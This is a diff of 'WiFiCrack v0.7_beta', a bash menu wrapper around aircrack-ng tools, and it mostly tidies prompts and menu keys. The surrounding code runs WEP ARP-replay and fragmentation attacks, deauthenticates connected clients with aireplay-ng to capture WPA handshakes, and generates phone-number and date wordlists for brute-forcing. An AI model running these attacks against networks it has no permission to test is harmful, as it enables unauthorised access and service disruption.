@@ -22,11 +22,10 @@ AIRCRACK=$(command -v aircrack-ng)
 NMCLI=$(command -v nmcli)
 MACCHANGER=$(command -v macchanger)
 XTERM=$(command -v xterm)
-
 if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z "$XTERM" ]]; then
 
     DISTRO=$(for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null); do echo "${f:5:${#f}-13}"; done;)
-    
+
     if [[ -z "$AIRCRACK" ]]; then
         AIRCRACK=" aircrack-ng "
     else
@@ -82,7 +81,7 @@ if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z 
             exit 1
     esac
 
-    while read -rn1 -p "-->$AIRCRACK$NMCLI$MACCHANGER$XTERM not found on your system, install now [yn] ? " DYN
+    while read -rn1 -p $'\n-->'"$AIRCRACK"''"$NMCLI"''"$MACCHANGER"''"$XTERM"' not found on your system, install now [yn] ? ' DYN
     do
         case "$DYN" in
             [Yy] )
@@ -99,7 +98,6 @@ if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z 
                 break
                 ;;
             * )
-                echo
                 ;;
         esac
     done
@@ -111,6 +109,9 @@ echo -ne "------- Phone number generator, using crunch. -------\n\n[c] to Cancel
 while read -rn2 -p "Phone Number length : " LENGTH
 do
     case "$LENGTH" in
+        [1-9] )
+            break
+            ;;
         1[0-9] )
             break
             ;;
@@ -151,7 +152,8 @@ do
             generate_wordlists
             ;;
         * )
-            echo -ne "\nInvalid prefix $PREFIX : \n" 
+            echo -ne "\nInvalid prefix $PREFIX\n"
+            ;;
     esac
 done
 echo
@@ -169,7 +171,8 @@ do
             ;;
         * )
             echo -ne "\nInvalid number $RECURRING : \n"
-        esac
+            ;;
+    esac
 done
 PREFIX_LENGTH=${#PREFIX}
 SUFFIX_LENGTH=$(("$LENGTH" - "$PREFIX_LENGTH" + 1))
@@ -225,7 +228,6 @@ while [[ "$FLAG" != 0 ]]; do
         fi
     fi
 done
-##Save As
 DATE_LIST=$(seq 0 "$DATE_DIFF")
 echo "Please wait... Generating dates."
 NAME_F=$(awk -F '-' '{print $1}' <<< $FIRST_DATE)
@@ -240,31 +242,28 @@ generate_wordlists
 }
 function generate_wordlists {
 clear
-echo "---------------- Generate Wordlists ----------------"
-echo -ne "\nd) Generate Dates\np) Generate Phone numbers\n\nc) Cancel\n\n"
-while read -rn1 -p "Select : " WORD
+echo -ne "---------------- Generate Wordlists ----------------\n\nd) Generate Dates\np) Generate Phone numbers\n\nc) Cancel\n\n"
+while read -rn1 -p $'\nSelect : ' WORD
 do
     case "$WORD" in
-        d )
+        [Dd] )
             dates_wl
             break
             ;;
-        p )
+        [Pp] )
             CRUNCH=$(command -v crunch)
             if [[ -z "$CRUNCH" ]]; then
-                echo -ne "\nCrunch is not installed. Install it and try again."
-                read -rp "Press Enter to go back..."
+                read -rp $'\nCrunch is not installed. Install it and try again.\nPress Enter to go back...'
                 options
             fi
             phones_wl
             break
             ;;
-        c )
+        [Cc] )
             options
             break
             ;;
         * )
-            echo
             ;;
     esac
 done
@@ -286,8 +285,8 @@ unset FLG
 }
 function filter_APs {
 clear
-echo -ne "Select Cracking Mode\n\n1) WEP\n2) WPA 1/2\n\nc) Cancel\n\n"
-while read -rn1 -p "Select : " MODE
+echo -ne "Select Cracking Mode\n\n1) WEP\n2) WPA 1/2\n\nc) Cancel\n"
+while read -rn1 -p $'\nSelect : ' MODE
 do
     case "$MODE" in
         1 )
@@ -304,20 +303,18 @@ do
             wpa_attacks
             break
             ;;
-        c )
+        [Cc] )
             options
             break
             ;;
         * )
-            echo
             ;;
     esac
 done
 }
 function list_APs {
 clear
-echo "----------------------- <Access Point Selection> -----------------------"
-echo "Filtered by : $MODE"
+echo -ne "----------------------- <Access Point Selection> -----------------------\nFiltered by : $MODE"
 if [[ -n "$STATE" ]]; then
     echo -ne "\nPlease wait ..."
     unset_mon >> /dev/null
@@ -348,14 +345,13 @@ else
 fi
 }
 function de-auth {
-echo
-read -rp "Enter Client MAC you wish to de-auth and press enter. : " CLIENT
+read -rp $'\nEnter Client MAC you wish to de-auth and press enter. : ' CLIENT
 grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' <<< $CLIENT
 if [[ "$?" != 0 ]]; then
     echo -ne "\nInvalid MAC address!"
     de-auth
 fi
-while read -rn2 -p "How many times ? [1-99] : " TIMES
+while read -rn2 -p $'\nHow many times ? [1-99] : ' TIMES
 do
     case "$TIMES" in
         [1-9][0-9] )
@@ -371,7 +367,6 @@ do
             break
             ;;
         * )
-            echo
             ;;
     esac
 done
@@ -385,34 +380,29 @@ ESSID=$(tr -d ' ' <<< "$ESSID")
 AIRODUMP="airodump-ng --bssid $BSSID -c $CHAN -w $ESSID $IFACE"
 env -u SESSION_MANAGER xterm -hold -e "$AIRODUMP" &
 echo -ne "You need to capture a 4-Way Handshake and then brute-force the .cap file against a wordlist. 
-You capture a 4-Way Handshake by forcing an already connected client to disconnect, the client will automatically try to reconnect and in the process will share his/her 4-Way Handshake with all the listening parties. ie. You and the Access Point (Modem/Router). Client MAC is displayed under the STATION collumn in the airodump-ng window. If no clients are connected you cannot capture a Handshake.\n\nWhen a client you want to de-auth shows up in the airodump-ng window. Press Space to pause the output, select the MAC address and Press Ctrl + Shift + C to copy it. Then paste it here and press Space on the airodump-ng window to continue the output.\n"
-while read -rn1 -p "Are any clients connected ? [yn] " YESNO
+You capture a 4-Way Handshake by forcing an already connected client to disconnect, the client will automatically try to reconnect and in the process will share his/her 4-Way Handshake with all the listening parties. ie. You and the Access Point (Modem/Router). Client MAC is displayed under the STATION collumn in the airodump-ng window. If no clients are connected you cannot capture a Handshake.\n\nWhen a client you want to de-auth shows up in the airodump-ng window. Press Space to pause the output, select the MAC address and Press Ctrl + Shift + C to copy it. Then paste it here and press Space on the airodump-ng window to continue the output."
+while read -rn1 -p $'\nAre any clients connected ? [yn] ' YESNO
 do
     case "$YESNO" in
         [Yy] )
             de-auth
-            echo
-            while read -rn1 -p "[c] Cancel [y] Try again [n] Change settings : " CON
+            while read -rn1 -p $'\n[c] Cancel [y] Try again [n] Change settings : ' CON
             do
                 case "$CON" in
                     [Yy] )
                         echo
                         aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
-                        echo
                         ;;
                     [Nn] )
                         de-auth
-                        echo
                         ;;
                     [Cc] )
                         kill "$(pgrep xterm)"
 						clean_up
-                        echo
-                        read -rp "Press Enter to go back "
+                        read -rep $'\nPress Enter to go back '
                         options
                         ;;
                     * )
-                        echo
                         ;;
                 esac
             done
@@ -424,25 +414,22 @@ do
             rm -f "$ESSID"*.cap
             rm -f "$ESSID"*.csv
             rm -f replay*.cap
-            echo
-            read -rp "Press Enter to go back "
+            read -rep $'\nPress Enter to go back '
             options
             break
             ;;
         * )
-            echo
             ;;
     esac
 done
 }
 function clean_up {
-echo
-while read -rn1 -p "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] " ASR 
-do 
+while read -rn1 -p $'\nClean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] ' ASR 
+do
     case "$ASR" in
         [Yy] )
             echo
-            while read -rn1 -p -ne "Keep $ESSID.cap file ? [yn] " ANS
+            while read -rn1 -p -ne $'\nKeep $ESSID.cap file ? [yn] ' ANS
             do
                 case "$ANS" in
                     [Yy] )
@@ -467,7 +454,6 @@ do
                         break
                         ;;
                     * )
-                        echo
                         ;;
                 esac
             done
@@ -478,12 +464,11 @@ do
             break
             ;;
         * )
-            echo
             ;;
     esac
 done
 }
-function fragmentation { 
+function fragmentation {
 clear
 echo "------------ WEP Fragmentation method ------------"
 read -rp "Press Enter to continue"
@@ -528,7 +513,7 @@ if [[ "$PRGA" = 0 ]]; then
     env -u SESSION_MANAGER xterm -hold -e "$CAPTURE" &
     echo y | aireplay-ng -2 -r "$ESSID".arp "$IFACE" &>/dev/null &
     clear
-    while read -rn1 -p "Crack $ESSID now [yn] ? " ANSWER
+    while read -rn1 -p $'\nCrack $ESSID now [yn] ? ' ANSWER
     do
         case "$ANSWER" in
             [Yy] )
@@ -559,7 +544,6 @@ if [[ "$PRGA" = 0 ]]; then
                 options
                 ;;
             * )
-                echo
                 ;;
         esac
     done
@@ -603,8 +587,8 @@ if [[ "$SUCCESS" != 0 ]]; then
     read -rp "Press Enter to go back"
     options
 fi
-echo -ne "Wait for #Data in airodump-ng to reach at least 15K before you proceed...\n"
-while read -rn1 -p "Proceed ? [yn] " ANS
+echo -ne "Wait for #Data in airodump-ng to reach at least 15K before you proceed..."
+while read -rn1 -p $'\nProceed ? [yn] ' ANS
 do
     case "$ANS" in
         [Yy] )
@@ -630,7 +614,6 @@ do
             break
             ;;
         * )
-            echo
             ;;
     esac
 done
@@ -639,7 +622,7 @@ function wep_attacks {
 clear
 echo "-------------- Select Attack Method --------------"
 echo -ne "\nYou picked ($AP)\n\nAP Name       : $ESSID\nAP Channel    : $CHAN\nAP MAC        : $BSSID\nAP Signal     : $SIG/100\n\n1) ARP Replay Attack\n2) Fragmentation Attack\n\ns) Select different AP\nc) Cancel\n\n"
-while read -rn1 -p "Select : " SEL
+while read -rn1 -p $'\nSelect : ' SEL
 do
     case "$SEL" in
         1 )
@@ -650,18 +633,17 @@ do
             fragmentation
             break
             ;;
-        s )
+        [Ss] )
             clear
             list_APs
             wep_attacks
             break
             ;;
-        c )
+        [Cc] )
             options
             break
             ;;
         * )
-            echo
             ;;
     esac
 done
@@ -741,10 +723,10 @@ if [[ -z "$STATE" ]]; then
     echo "$IFACE is in monitor mode and it's MAC address is: $NEWMAC"
     unset CHANFLAG
 else
-    echo -ne "\n$IFACE already in monitor mode."
     NEWMAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
-    sleep 2
     unset CHANFLAG
+    echo -ne "\n$IFACE already in monitor mode."
+    sleep 2
 fi
 }
 function show_APs {
@@ -755,10 +737,10 @@ if [[ -n "$STATE" ]]; then
     sleep 5
 fi
 nmcli -p dev wifi list
-while read -rn1 -p "Press [r] to rescan or Enter to go back : " SLCT
+while read -rn1 -p "Press [v] to rescan or Enter to go back " SLCT
 do
     case "$SLCT" in
-        [Rr] )
+        [Vv] )
             show_APs
             break
             ;;
@@ -771,6 +753,8 @@ done
 }
 function menu {
 clear
+STATE=$(iw "$IFACE" info | grep monitor)
+MAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
 if [[ "$IFACENUM" -gt 1 ]]; then
     SWITCH="c) Change Interface"
 fi
@@ -779,28 +763,17 @@ if [[ -n "$STATE" ]]; then
 else
     MM=OFF
 fi
-MAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
-echo "----------------------- WiFiCrack v0.7_beta -----------------------"
-echo "WLAN Interface : $IFACE                MAC : $MAC"
+echo -ne "----------------------- WiFiCrack v0.7_beta -----------------------\nWLAN Interface : $IFACE                MAC : $MAC\n"
 if [[ "$MM" = "ON" ]]; then
     echo "Monitor Mode   : >> $MM <<"
 else
     echo "Monitor Mode   : $MM"
 fi
-echo
-echo "1) Crack"
-echo "e) Enable <M/M>"
-echo "d) Disable <M/M>"
-echo "w) Generate Wordlists"
-echo "h) View Help"
-echo "v) View APs"
-echo "s) Show Info"
+echo -ne "\n1) Crack\ne) Enable <M/M>\nd) Disable <M/M>\nw) Generate Wordlists\nh) View Help\nv) View APs\ns) Show Info\n"
 if [[ -n "$SWITCH" ]]; then
-    echo "$SWITCH"
+    echo -ne "$SWITCH\n"
 fi
-echo "t) Test Injection"
-echo "q) Abort!"
-echo
+echo -ne "t) Test Injection\nq) Abort!\n\n"
 }
 function list_ifaces {
 clear
@@ -813,74 +786,64 @@ done
 IFACE=$(awk -F ' ' '{print $2}' <<< "$CHOICE")
 }
 function options {
-STATE=$(iw "$IFACE" info | grep monitor)
 menu
-while read -rn1 -p "Select : " CHAR
+while read -rn1 -p $'\nSelect : ' CHAR
 do
     case "$CHAR" in
         1 )
             filter_APs
             break
             ;;
-        e )
+        [Ee] )
             set_mon
-            echo
-            clear
             options
             break
             ;;
-        w )
+        [Ww] )
             generate_wordlists
             break
             ;;
-        d )
+        [Dd] )
             unset_mon
-            clear
             options
             break
             ;;
-        h )
-            echo
+        [Hh] )
             help
             read -rp "Press Enter to go back"
             options
             break
             ;;
-        v )
+        [Vv] )
             show_APs
-            echo
             read -rp "Press Enter to go back"
             options
             break
             ;;
-        s )
+        [Ss] )
             show_info
-            echo
             read -rp "Press Enter to go back"
             options
             break
             ;;
-        t )
+        [Tt] )
             test_injection
             read -rp "Press Enter to go back"
             options
             break
             ;;
-        c )
+        [Cc] )
             if [[ "$IFACENUM" -gt 1 ]]; then
                 list_ifaces
                 options
                 break
-            else
-                echo
             fi
             ;;
-        q )
+        [Qq] )
             clear
             exit 0
             ;;
         * )
-            echo
             ;;
     esac
 done
